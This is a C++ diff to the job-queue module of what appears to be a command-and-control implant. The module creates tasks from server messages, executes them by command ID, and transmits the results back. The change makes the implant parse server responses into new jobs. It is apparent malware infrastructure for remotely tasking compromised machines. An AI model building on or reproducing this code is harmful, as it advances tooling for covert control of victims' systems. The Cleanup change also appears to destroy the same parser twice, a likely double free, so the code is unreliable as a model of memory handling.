@@ -2,19 +2,30 @@
 
 auto DECLFN Jobs::Create(
     _In_ CHAR*   UUID, 
-    _In_ PARSER* Parser
+    _In_ PARSER* Parser,
+    _In_ BOOL    IsResponse
 ) -> JOBS* {
-    JOBS*   NewJob = (JOBS*)Self->Hp->Alloc( sizeof( JOBS ) );
-    PARSER* JobPsr = (PARSER*)Self->Hp->Alloc( sizeof( PARSER ) );
+    JOBS*   NewJob = (JOBS*)hAlloc( sizeof( JOBS ) );
+    PARSER* JobPsr = (PARSER*)hAlloc( sizeof( PARSER ) );
 
     if ( !NewJob || !JobPsr ) {
-        if ( NewJob ) Self->Hp->Free( NewJob );
-        if ( JobPsr ) Self->Hp->Free( JobPsr );
+        if ( NewJob ) hFree( NewJob );
+        if ( JobPsr ) hFree( JobPsr );
         return nullptr;
     }
-    
+
     ULONG Length = 0;
-    PVOID Data   = Self->Psr->Bytes( Parser, &Length );
+    PVOID Data   = nullptr;
+    
+    if ( IsResponse ) {
+        Self->Psr->Pad( Parser, Length );
+        Length = Parser->Length;
+        Data   = Parser->Buffer;
+        NewJob->Destroy = Parser;
+    } else {
+        Length = 0;
+        Data   = Self->Psr->Bytes( Parser, &Length );
+    }
 
     KhDbg( "data at %p [%d bytes] to parse", Data, Length );
 
@@ -28,8 +39,8 @@ auto DECLFN Jobs::Create(
     NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, UUID );
 
     if ( ! NewJob->Pkg ) {
-        Self->Hp->Free( NewJob );
-        Self->Hp->Free( JobPsr );
+        hFree( NewJob );
+        hFree( JobPsr );
         return nullptr;
     }
 
@@ -55,8 +66,10 @@ auto DECLFN Jobs::Create(
 auto DECLFN Jobs::Send(
     _In_ PACKAGE* PostJobs
 ) -> VOID {
-    
     JOBS* Current = List;
+
+    BYTE*  Data   = nullptr;
+    UINT64 Lenght = 0;
 
     while ( Current ) {
         if ( 
@@ -110,7 +123,15 @@ auto DECLFN Jobs::Send(
         Current = Current->Next;
     }
     
-    Self->Pkg->Transmit( PostJobs, 0, 0 );
+    Self->Pkg->Transmit( PostJobs, (PVOID*)&Data, &Lenght );
+
+    if ( Lenght < 4 ) {
+        hFree( Data );
+    } else {
+        PARSER* Parser = (PARSER*)hAlloc( sizeof( PARSER ) );
+        Self->Psr->New( Parser, Data, Lenght );        
+        this->Create( (CHAR*)Self->Psr->Pad( Parser, 36 ), Parser, TRUE );
+    }
 
     return;
 }
@@ -139,7 +160,11 @@ auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
                 Self->Psr->Destroy( ToRemove->Psr );
             }
 
-            Self->Hp->Free( ToRemove );
+            if ( ToRemove->Destroy ) {
+                Self->Psr->Destroy( ToRemove->Psr );
+            }
+
+            hFree( ToRemove );
             
             Count--;
         } else {
@@ -149,13 +174,16 @@ auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
     }
 }
 
-auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
+auto DECLFN Jobs::ExecuteAll( VOID ) -> LONG {
     JOBS* Current = this->List;
+    LONG  FlagRet = 0;
 
     while ( Current ) {
         if ( Current->State == KH_JOB_PRE_START || Current->State == KH_JOB_RUNNING ) {
             KhDbg( "executing task UUID : %s", Current->UUID );
             KhDbg( "executing command id: %d", Current->CmdID );
+
+            FlagRet = 1;
 
             Current->State    = KH_JOB_RUNNING;
             ERROR_CODE Result = Self->Jbs->Execute( Current );
@@ -167,6 +195,8 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
 
         Current = Current->Next;
     }
+
+    return FlagRet;
 }
 
 auto DECLFN Jobs::Execute(
@@ -231,7 +261,7 @@ auto DECLFN Jobs::Remove(
         }
     }
     
-    Self->Hp->Free( Job );
+    hFree( Job );
     this->Count--;
 
     return TRUE;
